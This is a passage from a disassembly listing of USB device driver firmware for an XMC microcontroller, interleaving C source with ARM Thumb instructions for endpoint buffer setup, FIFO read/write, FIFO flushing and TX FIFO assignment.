 800438e:	af00      	add	r7, sp, #0
	if (device.Driver->IsEnumDone())
 8004390:	4b05      	ldr	r3, [pc, #20]	; (80043a8 <USB_IsEnumDone+0x1c>)
 8004392:	681b      	ldr	r3, [r3, #0]
 8004394:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004396:	4798      	blx	r3
 8004398:	4603      	mov	r3, r0
 800439a:	2b00      	cmp	r3, #0
 800439c:	d001      	beq.n	80043a2 <USB_IsEnumDone+0x16>
		return 1;
 800439e:	2301      	movs	r3, #1
 80043a0:	e000      	b.n	80043a4 <USB_IsEnumDone+0x18>
	else
		return 0;
 80043a2:	2300      	movs	r3, #0
 }
 80043a4:	4618      	mov	r0, r3
 80043a6:	bd80      	pop	{r7, pc}
 80043a8:	2000070c 	.word	0x2000070c

080043ac <USBD_SetEndpointBuffer>:
 *
 * \param[in] addr Endpoint address
 * \param[in] buf Buffer pointer
 * \param[in] len Buffer length
 */
void USBD_SetEndpointBuffer(uint8_t addr,uint8_t *buf,uint16_t len) {
 80043ac:	b480      	push	{r7}
 80043ae:	b085      	sub	sp, #20
 80043b0:	af00      	add	r7, sp, #0
 80043b2:	4603      	mov	r3, r0
 80043b4:	6039      	str	r1, [r7, #0]
 80043b6:	71fb      	strb	r3, [r7, #7]
 80043b8:	4613      	mov	r3, r2
 80043ba:	80bb      	strh	r3, [r7, #4]
	uint8_t number  = addr & ENDPOINT_EPNUM_MASK;
 80043bc:	79fb      	ldrb	r3, [r7, #7]
 80043be:	f003 030f 	and.w	r3, r3, #15
 80043c2:	73fb      	strb	r3, [r7, #15]
	if (addr & ENDPOINT_DIR_MASK) {
 80043c4:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80043c8:	2b00      	cmp	r3, #0
 80043ca:	da12      	bge.n	80043f2 <USBD_SetEndpointBuffer+0x46>
		device.Endpoints[number].InBuffer = buf;
 80043cc:	7bfb      	ldrb	r3, [r7, #15]
 80043ce:	4a15      	ldr	r2, [pc, #84]	; (8004424 <USBD_SetEndpointBuffer+0x78>)
 80043d0:	212c      	movs	r1, #44	; 0x2c
 80043d2:	fb01 f303 	mul.w	r3, r1, r3
 80043d6:	4413      	add	r3, r2
 80043d8:	3320      	adds	r3, #32
 80043da:	683a      	ldr	r2, [r7, #0]
 80043dc:	601a      	str	r2, [r3, #0]
		device.Endpoints[number].InBufferLength = len;
 80043de:	7bfb      	ldrb	r3, [r7, #15]
 80043e0:	88ba      	ldrh	r2, [r7, #4]
 80043e2:	4910      	ldr	r1, [pc, #64]	; (8004424 <USBD_SetEndpointBuffer+0x78>)
 80043e4:	202c      	movs	r0, #44	; 0x2c
 80043e6:	fb00 f303 	mul.w	r3, r0, r3
 80043ea:	440b      	add	r3, r1
 80043ec:	3324      	adds	r3, #36	; 0x24
 80043ee:	601a      	str	r2, [r3, #0]
	} else {
		device.Endpoints[number].OutBuffer = buf;
		device.Endpoints[number].OutBufferLength = len;
	}
}
 80043f0:	e011      	b.n	8004416 <USBD_SetEndpointBuffer+0x6a>
		device.Endpoints[number].OutBuffer = buf;
 80043f2:	7bfb      	ldrb	r3, [r7, #15]
 80043f4:	4a0b      	ldr	r2, [pc, #44]	; (8004424 <USBD_SetEndpointBuffer+0x78>)
 80043f6:	212c      	movs	r1, #44	; 0x2c
 80043f8:	fb01 f303 	mul.w	r3, r1, r3
 80043fc:	4413      	add	r3, r2
 80043fe:	3314      	adds	r3, #20
 8004400:	683a      	ldr	r2, [r7, #0]
 8004402:	601a      	str	r2, [r3, #0]
		device.Endpoints[number].OutBufferLength = len;
 8004404:	7bfb      	ldrb	r3, [r7, #15]
 8004406:	88ba      	ldrh	r2, [r7, #4]
 8004408:	4906      	ldr	r1, [pc, #24]	; (8004424 <USBD_SetEndpointBuffer+0x78>)
 800440a:	202c      	movs	r0, #44	; 0x2c
 800440c:	fb00 f303 	mul.w	r3, r0, r3
 8004410:	440b      	add	r3, r1
 8004412:	3318      	adds	r3, #24
 8004414:	601a      	str	r2, [r3, #0]
}
 8004416:	bf00      	nop
 8004418:	3714      	adds	r7, #20
 800441a:	46bd      	mov	sp, r7
 800441c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004420:	4770      	bx	lr
 8004422:	bf00      	nop
 8004424:	2000070c 	.word	0x2000070c

08004428 <XMC_USBD_lDeviceActive>:
 * Therefore the endpoint inInUse flag are checked and if one endpoint is in use, 1 is returned,
 * else 0 is returned.
 * @return 1 if an endpoint is active else 0
 */
uint8_t XMC_USBD_lDeviceActive(const XMC_USBD_t *const obj) 
{
 8004428:	b480      	push	{r7}
 800442a:	b085      	sub	sp, #20
 800442c:	af00      	add	r7, sp, #0
 800442e:	6078      	str	r0, [r7, #4]
  uint8_t i;
  uint8_t result = 0U;
 8004430:	2300      	movs	r3, #0
 8004432:	73bb      	strb	r3, [r7, #14]
  for (i = 0U; i < (uint8_t)obj->usbd_max_num_eps; i++)
 8004434:	2300      	movs	r3, #0
 8004436:	73fb      	strb	r3, [r7, #15]
 8004438:	e01c      	b.n	8004474 <XMC_USBD_lDeviceActive+0x4c>
  {
    if (xmc_device.ep[i].inInUse || xmc_device.ep[i].outInUse)
 800443a:	7bfb      	ldrb	r3, [r7, #15]
 800443c:	4a13      	ldr	r2, [pc, #76]	; (800448c <XMC_USBD_lDeviceActive+0x64>)
 800443e:	2134      	movs	r1, #52	; 0x34
 8004440:	fb01 f303 	mul.w	r3, r1, r3
 8004444:	4413      	add	r3, r2
 8004446:	685b      	ldr	r3, [r3, #4]
 8004448:	f3c3 03c0 	ubfx	r3, r3, #3, #1
 800444c:	b2db      	uxtb	r3, r3
 800444e:	2b00      	cmp	r3, #0
 8004450:	d10b      	bne.n	800446a <XMC_USBD_lDeviceActive+0x42>
 8004452:	7bfb      	ldrb	r3, [r7, #15]
 8004454:	4a0d      	ldr	r2, [pc, #52]	; (800448c <XMC_USBD_lDeviceActive+0x64>)
 8004456:	2134      	movs	r1, #52	; 0x34
 8004458:	fb01 f303 	mul.w	r3, r1, r3
 800445c:	4413      	add	r3, r2
 800445e:	685b      	ldr	r3, [r3, #4]
 8004460:	f3c3 1300 	ubfx	r3, r3, #4, #1
 8004464:	b2db      	uxtb	r3, r3
 8004466:	2b00      	cmp	r3, #0
 8004468:	d001      	beq.n	800446e <XMC_USBD_lDeviceActive+0x46>
    {
      result = 1U;
 800446a:	2301      	movs	r3, #1
 800446c:	73bb      	strb	r3, [r7, #14]
  for (i = 0U; i < (uint8_t)obj->usbd_max_num_eps; i++)
 800446e:	7bfb      	ldrb	r3, [r7, #15]
 8004470:	3301      	adds	r3, #1
 8004472:	73fb      	strb	r3, [r7, #15]
 8004474:	687b      	ldr	r3, [r7, #4]
 8004476:	7b1b      	ldrb	r3, [r3, #12]
 8004478:	7bfa      	ldrb	r2, [r7, #15]
 800447a:	429a      	cmp	r2, r3
 800447c:	d3dd      	bcc.n	800443a <XMC_USBD_lDeviceActive+0x12>
    }
  }
  return result;
 800447e:	7bbb      	ldrb	r3, [r7, #14]
}
 8004480:	4618      	mov	r0, r3
 8004482:	3714      	adds	r7, #20
 8004484:	46bd      	mov	sp, r7
 8004486:	f85d 7b04 	ldr.w	r7, [sp], #4
 800448a:	4770      	bx	lr
 800448c:	20000a84 	.word	0x20000a84

08004490 <XMC_USBD_lReadFifo>:
 *
 * @arg ep_num the endpoint to read for
 * @arg byte_count the byte count to read
 */
static void XMC_USBD_lReadFifo(const uint32_t ep_num,const uint32_t byte_count) 
{
 8004490:	b480      	push	{r7}
 8004492:	b08b      	sub	sp, #44	; 0x2c
 8004494:	af00      	add	r7, sp, #0
 8004496:	6078      	str	r0, [r7, #4]
 8004498:	6039      	str	r1, [r7, #0]
  XMC_USBD_EP_t * ep = &xmc_device.ep[ep_num];
 800449a:	687b      	ldr	r3, [r7, #4]
 800449c:	2234      	movs	r2, #52	; 0x34
 800449e:	fb02 f303 	mul.w	r3, r2, r3
 80044a2:	4a34      	ldr	r2, [pc, #208]	; (8004574 <XMC_USBD_lReadFifo+0xe4>)
 80044a4:	4413      	add	r3, r2
 80044a6:	623b      	str	r3, [r7, #32]
  uint32_t word_count;
  uint32_t temp_data;
  uint32_t temp_word_count;
  volatile uint32_t *fifo = xmc_device.fifo[0U];
 80044a8:	4b32      	ldr	r3, [pc, #200]	; (8004574 <XMC_USBD_lReadFifo+0xe4>)
 80044aa:	f8d3 31e0 	ldr.w	r3, [r3, #480]	; 0x1e0
 80044ae:	61fb      	str	r3, [r7, #28]
  uint32_t i;
  depctl_data_t data;
  data.d32 = xmc_device.endpoint_out_register[ep_num]->doepctl;
 80044b0:	4a30      	ldr	r2, [pc, #192]	; (8004574 <XMC_USBD_lReadFifo+0xe4>)
 80044b2:	687b      	ldr	r3, [r7, #4]
 80044b4:	3370      	adds	r3, #112	; 0x70
 80044b6:	009b      	lsls	r3, r3, #2
 80044b8:	4413      	add	r3, r2
 80044ba:	685b      	ldr	r3, [r3, #4]
 80044bc:	681b      	ldr	r3, [r3, #0]
 80044be:	60fb      	str	r3, [r7, #12]
  word_count = (byte_count >> 2U );
 80044c0:	683b      	ldr	r3, [r7, #0]
 80044c2:	089b      	lsrs	r3, r3, #2
 80044c4:	61bb      	str	r3, [r7, #24]
  temp_word_count = (word_count << 2U);
 80044c6:	69bb      	ldr	r3, [r7, #24]
 80044c8:	009b      	lsls	r3, r3, #2
 80044ca:	617b      	str	r3, [r7, #20]
  /* Check if ep is enabled and has buffer */
  if (!data.b.usbactep)
 80044cc:	7b7b      	ldrb	r3, [r7, #13]
 80044ce:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 80044d2:	b2db      	uxtb	r3, r3
 80044d4:	2b00      	cmp	r3, #0
 80044d6:	d047      	beq.n	8004568 <XMC_USBD_lReadFifo+0xd8>
  {
    /*Do Nothing*/
  }
  else if (ep->xferBuffer == NULL)
 80044d8:	6a3b      	ldr	r3, [r7, #32]
 80044da:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80044dc:	2b00      	cmp	r3, #0
 80044de:	d043      	beq.n	8004568 <XMC_USBD_lReadFifo+0xd8>
	/*Do Nothing*/
  }
  else
  {
    /* store the data */
    for (i = 0U;i < word_count; i++)
 80044e0:	2300      	movs	r3, #0
 80044e2:	627b      	str	r3, [r7, #36]	; 0x24
 80044e4:	e00a      	b.n	80044fc <XMC_USBD_lReadFifo+0x6c>
    {
      *(((uint32_t*)ep->xferBuffer)+i) = *fifo;
 80044e6:	6a3b      	ldr	r3, [r7, #32]
 80044e8:	6a5a      	ldr	r2, [r3, #36]	; 0x24
 80044ea:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80044ec:	009b      	lsls	r3, r3, #2
 80044ee:	4413      	add	r3, r2
 80044f0:	69fa      	ldr	r2, [r7, #28]
 80044f2:	6812      	ldr	r2, [r2, #0]
 80044f4:	601a      	str	r2, [r3, #0]
    for (i = 0U;i < word_count; i++)
 80044f6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80044f8:	3301      	adds	r3, #1
 80044fa:	627b      	str	r3, [r7, #36]	; 0x24
 80044fc:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 80044fe:	69bb      	ldr	r3, [r7, #24]
 8004500:	429a      	cmp	r2, r3
 8004502:	d3f0      	bcc.n	80044e6 <XMC_USBD_lReadFifo+0x56>
    }
    /* space is not devidable by 4 */
    if (byte_count!=temp_word_count)
 8004504:	683a      	ldr	r2, [r7, #0]
 8004506:	697b      	ldr	r3, [r7, #20]
 8004508:	429a      	cmp	r2, r3
 800450a:	d021      	beq.n	8004550 <XMC_USBD_lReadFifo+0xc0>
    {
      temp_data = *fifo;
 800450c:	69fb      	ldr	r3, [r7, #28]
 800450e:	681b      	ldr	r3, [r3, #0]
 8004510:	613b      	str	r3, [r7, #16]
      for (i = 0U;(temp_word_count + i) < byte_count;i++)
 8004512:	2300      	movs	r3, #0
 8004514:	627b      	str	r3, [r7, #36]	; 0x24
 8004516:	e015      	b.n	8004544 <XMC_USBD_lReadFifo+0xb4>
      {
        ep->xferBuffer[(word_count << 2)+i] = (uint8_t)((temp_data & ((uint32_t)0xFFU << (i * 8U))) >> (i * 8U));
 8004518:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800451a:	00db      	lsls	r3, r3, #3
 800451c:	22ff      	movs	r2, #255	; 0xff
 800451e:	409a      	lsls	r2, r3
 8004520:	693b      	ldr	r3, [r7, #16]
 8004522:	401a      	ands	r2, r3
 8004524:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004526:	00db      	lsls	r3, r3, #3
 8004528:	fa22 f003 	lsr.w	r0, r2, r3
 800452c:	6a3b      	ldr	r3, [r7, #32]
 800452e:	6a5a      	ldr	r2, [r3, #36]	; 0x24
 8004530:	69bb      	ldr	r3, [r7, #24]
 8004532:	0099      	lsls	r1, r3, #2
 8004534:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004536:	440b      	add	r3, r1
 8004538:	4413      	add	r3, r2
 800453a:	b2c2      	uxtb	r2, r0
 800453c:	701a      	strb	r2, [r3, #0]
      for (i = 0U;(temp_word_count + i) < byte_count;i++)
 800453e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004540:	3301      	adds	r3, #1
 8004542:	627b      	str	r3, [r7, #36]	; 0x24
 8004544:	697a      	ldr	r2, [r7, #20]
 8004546:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004548:	4413      	add	r3, r2
 800454a:	683a      	ldr	r2, [r7, #0]
 800454c:	429a      	cmp	r2, r3
 800454e:	d8e3      	bhi.n	8004518 <XMC_USBD_lReadFifo+0x88>
      }
    }

    /* save the amount of data */
    ep->xferCount += byte_count;
 8004550:	6a3b      	ldr	r3, [r7, #32]
 8004552:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8004554:	683b      	ldr	r3, [r7, #0]
 8004556:	441a      	add	r2, r3
 8004558:	6a3b      	ldr	r3, [r7, #32]
 800455a:	62da      	str	r2, [r3, #44]	; 0x2c
    ep->xferBuffer += byte_count;
 800455c:	6a3b      	ldr	r3, [r7, #32]
 800455e:	6a5a      	ldr	r2, [r3, #36]	; 0x24
 8004560:	683b      	ldr	r3, [r7, #0]
 8004562:	441a      	add	r2, r3
 8004564:	6a3b      	ldr	r3, [r7, #32]
 8004566:	625a      	str	r2, [r3, #36]	; 0x24
  }
}
 8004568:	bf00      	nop
 800456a:	372c      	adds	r7, #44	; 0x2c
 800456c:	46bd      	mov	sp, r7
 800456e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004572:	4770      	bx	lr
 8004574:	20000a84 	.word	0x20000a84

08004578 <XMC_USBD_lWriteFifo>:
 *
 * @arg[in] ep the endpoint to use
 * @return the number of bytes written to the fifo
 */
static uint32_t XMC_USBD_lWriteFifo(XMC_USBD_EP_t *const ep) 
{
 8004578:	b480      	push	{r7}
 800457a:	b089      	sub	sp, #36	; 0x24
 800457c:	af00      	add	r7, sp, #0
 800457e:	6078      	str	r0, [r7, #4]
  volatile uint32_t *fifo;
  uint32_t byte_count;
  uint32_t word_count;
  uint32_t result;
  uint32_t i;
  fifo = xmc_device.fifo[ep->address_u.address_st.number]; /* fifo */
 8004580:	687b      	ldr	r3, [r7, #4]
 8004582:	781b      	ldrb	r3, [r3, #0]
 8004584:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8004588:	b2db      	uxtb	r3, r3
 800458a:	4a23      	ldr	r2, [pc, #140]	; (8004618 <XMC_USBD_lWriteFifo+0xa0>)
 800458c:	3378      	adds	r3, #120	; 0x78
 800458e:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004592:	60fb      	str	r3, [r7, #12]
  freeSpace.d32 = xmc_device.endpoint_in_register[ep->address_u.address_st.number]->dtxfsts;
 8004594:	687b      	ldr	r3, [r7, #4]
 8004596:	781b      	ldrb	r3, [r3, #0]
 8004598:	f3c3 0303 	ubfx	r3, r3, #0, #4
 800459c:	b2db      	uxtb	r3, r3
 800459e:	4a1e      	ldr	r2, [pc, #120]	; (8004618 <XMC_USBD_lWriteFifo+0xa0>)
 80045a0:	336a      	adds	r3, #106	; 0x6a
 80045a2:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 80045a6:	699b      	ldr	r3, [r3, #24]
 80045a8:	60bb      	str	r3, [r7, #8]
  /* calculate the length and the amount of dwords to copy based on the fifo status */
  byte_count = ep->xferLength - ep->xferCount;
 80045aa:	687b      	ldr	r3, [r7, #4]
 80045ac:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 80045ae:	687b      	ldr	r3, [r7, #4]
 80045b0:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80045b2:	1ad3      	subs	r3, r2, r3
 80045b4:	61fb      	str	r3, [r7, #28]
  if (!byte_count)
 80045b6:	69fb      	ldr	r3, [r7, #28]
 80045b8:	2b00      	cmp	r3, #0
 80045ba:	d102      	bne.n	80045c2 <XMC_USBD_lWriteFifo+0x4a>
  {
    result = 0U;
 80045bc:	2300      	movs	r3, #0
 80045be:	617b      	str	r3, [r7, #20]
 80045c0:	e023      	b.n	800460a <XMC_USBD_lWriteFifo+0x92>
  }
  else
  {
    /* add the unaligned bytes to the word count to compare with the fifo space */
    word_count = ((uint32_t)byte_count + 3U) >> 2U;
 80045c2:	69fb      	ldr	r3, [r7, #28]
 80045c4:	3303      	adds	r3, #3
 80045c6:	089b      	lsrs	r3, r3, #2
 80045c8:	61bb      	str	r3, [r7, #24]
    if (word_count > (uint32_t)freeSpace.b.txfspcavail )
 80045ca:	893b      	ldrh	r3, [r7, #8]
 80045cc:	461a      	mov	r2, r3
 80045ce:	69bb      	ldr	r3, [r7, #24]
 80045d0:	4293      	cmp	r3, r2
 80045d2:	d904      	bls.n	80045de <XMC_USBD_lWriteFifo+0x66>
    {
      word_count = (uint32_t)freeSpace.b.txfspcavail;
 80045d4:	893b      	ldrh	r3, [r7, #8]
 80045d6:	61bb      	str	r3, [r7, #24]
      byte_count = (uint32_t)word_count << (uint32_t)2U;
 80045d8:	69bb      	ldr	r3, [r7, #24]
 80045da:	009b      	lsls	r3, r3, #2
 80045dc:	61fb      	str	r3, [r7, #28]
    }

    /* copy data dword wise */
    for (i = 0U; i < word_count;ep->xferBuffer+= 4U)
 80045de:	2300      	movs	r3, #0
 80045e0:	613b      	str	r3, [r7, #16]
 80045e2:	e00c      	b.n	80045fe <XMC_USBD_lWriteFifo+0x86>
    {
      *fifo = *(uint32_t*)ep->xferBuffer;
 80045e4:	687b      	ldr	r3, [r7, #4]
 80045e6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80045e8:	681a      	ldr	r2, [r3, #0]
 80045ea:	68fb      	ldr	r3, [r7, #12]
 80045ec:	601a      	str	r2, [r3, #0]
      i++;
 80045ee:	693b      	ldr	r3, [r7, #16]
 80045f0:	3301      	adds	r3, #1
 80045f2:	613b      	str	r3, [r7, #16]
    for (i = 0U; i < word_count;ep->xferBuffer+= 4U)
 80045f4:	687b      	ldr	r3, [r7, #4]
 80045f6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80045f8:	1d1a      	adds	r2, r3, #4
 80045fa:	687b      	ldr	r3, [r7, #4]
 80045fc:	625a      	str	r2, [r3, #36]	; 0x24
 80045fe:	693a      	ldr	r2, [r7, #16]
 8004600:	69bb      	ldr	r3, [r7, #24]
 8004602:	429a      	cmp	r2, r3
 8004604:	d3ee      	bcc.n	80045e4 <XMC_USBD_lWriteFifo+0x6c>
    }
    result=byte_count;
 8004606:	69fb      	ldr	r3, [r7, #28]
 8004608:	617b      	str	r3, [r7, #20]
  }
  return result;
 800460a:	697b      	ldr	r3, [r7, #20]
}
 800460c:	4618      	mov	r0, r3
 800460e:	3724      	adds	r7, #36	; 0x24
 8004610:	46bd      	mov	sp, r7
 8004612:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004616:	4770      	bx	lr
 8004618:	20000a84 	.word	0x20000a84

0800461c <XMC_USBD_lFlushTXFifo>:
 * @param[in] fifo_num Fifo number to flush
 *
 * @note Use 0x10 as parameter to flush all tx fifos.
 */
static void XMC_USBD_lFlushTXFifo(const uint8_t fifo_num) 
{
 800461c:	b480      	push	{r7}
 800461e:	b085      	sub	sp, #20
 8004620:	af00      	add	r7, sp, #0
 8004622:	4603      	mov	r3, r0
 8004624:	71fb      	strb	r3, [r7, #7]
  volatile grstctl_t data;  
  uint32_t count;
  data.d32 = 0U;
 8004626:	2300      	movs	r3, #0
 8004628:	60bb      	str	r3, [r7, #8]
  /*flush fifo */
  data.b.txfflsh = 1U;
 800462a:	68bb      	ldr	r3, [r7, #8]
 800462c:	f043 0320 	orr.w	r3, r3, #32
 8004630:	60bb      	str	r3, [r7, #8]
  data.b.txfnum = fifo_num;
 8004632:	79fb      	ldrb	r3, [r7, #7]
 8004634:	f003 031f 	and.w	r3, r3, #31
 8004638:	b2da      	uxtb	r2, r3
 800463a:	68bb      	ldr	r3, [r7, #8]
 800463c:	f362 138a 	bfi	r3, r2, #6, #5
 8004640:	60bb      	str	r3, [r7, #8]
  xmc_device.global_register->grstctl = data.d32;
 8004642:	4b15      	ldr	r3, [pc, #84]	; (8004698 <XMC_USBD_lFlushTXFifo+0x7c>)
 8004644:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8004648:	68ba      	ldr	r2, [r7, #8]
 800464a:	611a      	str	r2, [r3, #16]
  for (count = 0U;count < 1000U; count++){}
 800464c:	2300      	movs	r3, #0
 800464e:	60fb      	str	r3, [r7, #12]
 8004650:	e002      	b.n	8004658 <XMC_USBD_lFlushTXFifo+0x3c>
 8004652:	68fb      	ldr	r3, [r7, #12]
 8004654:	3301      	adds	r3, #1
 8004656:	60fb      	str	r3, [r7, #12]
 8004658:	68fb      	ldr	r3, [r7, #12]
 800465a:	f5b3 7f7a 	cmp.w	r3, #1000	; 0x3e8
 800465e:	d3f8      	bcc.n	8004652 <XMC_USBD_lFlushTXFifo+0x36>
  do
  {
   data.d32 = xmc_device.global_register->grstctl;
 8004660:	4b0d      	ldr	r3, [pc, #52]	; (8004698 <XMC_USBD_lFlushTXFifo+0x7c>)
 8004662:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8004666:	691b      	ldr	r3, [r3, #16]
 8004668:	60bb      	str	r3, [r7, #8]
  } while (data.b.txfflsh);
 800466a:	68bb      	ldr	r3, [r7, #8]
 800466c:	f3c3 1340 	ubfx	r3, r3, #5, #1
 8004670:	b2db      	uxtb	r3, r3
 8004672:	2b00      	cmp	r3, #0
 8004674:	d1f4      	bne.n	8004660 <XMC_USBD_lFlushTXFifo+0x44>
    count = 0U;
 8004676:	2300      	movs	r3, #0
 8004678:	60fb      	str	r3, [r7, #12]
  while (count++ < 1000U)
 800467a:	bf00      	nop
 800467c:	68fb      	ldr	r3, [r7, #12]
 800467e:	1c5a      	adds	r2, r3, #1
 8004680:	60fa      	str	r2, [r7, #12]
 8004682:	f5b3 7f7a 	cmp.w	r3, #1000	; 0x3e8
 8004686:	d3f9      	bcc.n	800467c <XMC_USBD_lFlushTXFifo+0x60>
  {
    /* wait 3 phy clocks */
  }
}
 8004688:	bf00      	nop
 800468a:	bf00      	nop
 800468c:	3714      	adds	r7, #20
 800468e:	46bd      	mov	sp, r7
 8004690:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004694:	4770      	bx	lr
 8004696:	bf00      	nop
 8004698:	20000a84 	.word	0x20000a84

0800469c <XMC_USBD_lFlushRXFifo>:

/**
 * @brief Flush the rx fifo
 */
static void XMC_USBD_lFlushRXFifo(void) 
{
 800469c:	b480      	push	{r7}
 800469e:	b083      	sub	sp, #12
 80046a0:	af00      	add	r7, sp, #0
  volatile grstctl_t data;  
  uint32_t count;
	
	data.d32 = 0U;
 80046a2:	2300      	movs	r3, #0
 80046a4:	603b      	str	r3, [r7, #0]
  data.b.rxfflsh = 1U;
 80046a6:	683b      	ldr	r3, [r7, #0]
 80046a8:	f043 0310 	orr.w	r3, r3, #16
 80046ac:	603b      	str	r3, [r7, #0]
  /* flush FIFO */
  xmc_device.global_register->grstctl = data.d32;
 80046ae:	4b15      	ldr	r3, [pc, #84]	; (8004704 <XMC_USBD_lFlushRXFifo+0x68>)
 80046b0:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 80046b4:	683a      	ldr	r2, [r7, #0]
 80046b6:	611a      	str	r2, [r3, #16]
  do
  {
    for (count = 0U; count < 1000U; count++){}
 80046b8:	2300      	movs	r3, #0
 80046ba:	607b      	str	r3, [r7, #4]
 80046bc:	e002      	b.n	80046c4 <XMC_USBD_lFlushRXFifo+0x28>
 80046be:	687b      	ldr	r3, [r7, #4]
 80046c0:	3301      	adds	r3, #1
 80046c2:	607b      	str	r3, [r7, #4]
 80046c4:	687b      	ldr	r3, [r7, #4]
 80046c6:	f5b3 7f7a 	cmp.w	r3, #1000	; 0x3e8
 80046ca:	d3f8      	bcc.n	80046be <XMC_USBD_lFlushRXFifo+0x22>
    data.d32 = xmc_device.global_register->grstctl;
 80046cc:	4b0d      	ldr	r3, [pc, #52]	; (8004704 <XMC_USBD_lFlushRXFifo+0x68>)
 80046ce:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 80046d2:	691b      	ldr	r3, [r3, #16]
 80046d4:	603b      	str	r3, [r7, #0]
  } while (data.b.rxfflsh);
 80046d6:	683b      	ldr	r3, [r7, #0]
 80046d8:	f3c3 1300 	ubfx	r3, r3, #4, #1
 80046dc:	b2db      	uxtb	r3, r3
 80046de:	2b00      	cmp	r3, #0
 80046e0:	d1ea      	bne.n	80046b8 <XMC_USBD_lFlushRXFifo+0x1c>
  count = 0U;
 80046e2:	2300      	movs	r3, #0
 80046e4:	607b      	str	r3, [r7, #4]
  while (count++ < 1000U)
 80046e6:	bf00      	nop
 80046e8:	687b      	ldr	r3, [r7, #4]
 80046ea:	1c5a      	adds	r2, r3, #1
 80046ec:	607a      	str	r2, [r7, #4]
 80046ee:	f5b3 7f7a 	cmp.w	r3, #1000	; 0x3e8
 80046f2:	d3f9      	bcc.n	80046e8 <XMC_USBD_lFlushRXFifo+0x4c>
  {
    /* wait 3 phy clocks */
  }
}
 80046f4:	bf00      	nop
 80046f6:	bf00      	nop
 80046f8:	370c      	adds	r7, #12
 80046fa:	46bd      	mov	sp, r7
 80046fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004700:	4770      	bx	lr
 8004702:	bf00      	nop
 8004704:	20000a84 	.word	0x20000a84

08004708 <XMC_USBD_lAssignTXFifo>:
 * A free tx fifo will be searched and the number will be returned.
 *
 * @return Fifo number for a free fifo
 */
static uint8_t XMC_USBD_lAssignTXFifo(void) 
{
 8004708:	b480      	push	{r7}
 800470a:	b083      	sub	sp, #12
 800470c:	af00      	add	r7, sp, #0
  uint16_t mask = 1U;
 800470e:	2301      	movs	r3, #1
 8004710:	80fb      	strh	r3, [r7, #6]
  uint8_t i = 0U;
 8004712:	2300      	movs	r3, #0
 8004714:	717b      	strb	r3, [r7, #5]
  uint8_t result = 0U;
 8004716:	2300      	movs	r3, #0
 8004718:	713b      	strb	r3, [r7, #4]
  while( (i < (uint8_t)XMC_USBD_NUM_TX_FIFOS)&&((xmc_device.txfifomsk & mask) != 0U))
 800471a:	e005      	b.n	8004728 <XMC_USBD_lAssignTXFifo+0x20>
  {
    mask = (uint16_t)(mask << 1U);
 800471c:	88fb      	ldrh	r3, [r7, #6]
 800471e:	005b      	lsls	r3, r3, #1
 8004720:	80fb      	strh	r3, [r7, #6]
    i++;
 8004722:	797b      	ldrb	r3, [r7, #5]
 8004724:	3301      	adds	r3, #1
 8004726:	717b      	strb	r3, [r7, #5]
  while( (i < (uint8_t)XMC_USBD_NUM_TX_FIFOS)&&((xmc_device.txfifomsk & mask) != 0U))
 8004728:	797b      	ldrb	r3, [r7, #5]
 800472a:	2b06      	cmp	r3, #6
 800472c:	d807      	bhi.n	800473e <XMC_USBD_lAssignTXFifo+0x36>
 800472e:	4b11      	ldr	r3, [pc, #68]	; (8004774 <XMC_USBD_lAssignTXFifo+0x6c>)
 8004730:	f8b3 21fc 	ldrh.w	r2, [r3, #508]	; 0x1fc
 8004734:	88fb      	ldrh	r3, [r7, #6]
 8004736:	4013      	ands	r3, r2
 8004738:	b29b      	uxth	r3, r3
 800473a:	2b00      	cmp	r3, #0
 800473c:	d1ee      	bne.n	800471c <XMC_USBD_lAssignTXFifo+0x14>
  }
  if ((xmc_device.txfifomsk & mask) == 0U)
 800473e:	4b0d      	ldr	r3, [pc, #52]	; (8004774 <XMC_USBD_lAssignTXFifo+0x6c>)
 8004740:	f8b3 21fc 	ldrh.w	r2, [r3, #508]	; 0x1fc
 8004744:	88fb      	ldrh	r3, [r7, #6]
 8004746:	4013      	ands	r3, r2
 8004748:	b29b      	uxth	r3, r3
 800474a:	2b00      	cmp	r3, #0
 800474c:	d10a      	bne.n	8004764 <XMC_USBD_lAssignTXFifo+0x5c>
  {
    xmc_device.txfifomsk |= mask;
 800474e:	4b09      	ldr	r3, [pc, #36]	; (8004774 <XMC_USBD_lAssignTXFifo+0x6c>)
 8004750:	f8b3 21fc 	ldrh.w	r2, [r3, #508]	; 0x1fc
 8004754:	88fb      	ldrh	r3, [r7, #6]
 8004756:	4313      	orrs	r3, r2
 8004758:	b29a      	uxth	r2, r3
 800475a:	4b06      	ldr	r3, [pc, #24]	; (8004774 <XMC_USBD_lAssignTXFifo+0x6c>)
 800475c:	f8a3 21fc 	strh.w	r2, [r3, #508]	; 0x1fc
    result=i;
 8004760:	797b      	ldrb	r3, [r7, #5]
 8004762:	713b      	strb	r3, [r7, #4]
  }
  return result;
 8004764:	793b      	ldrb	r3, [r7, #4]
}
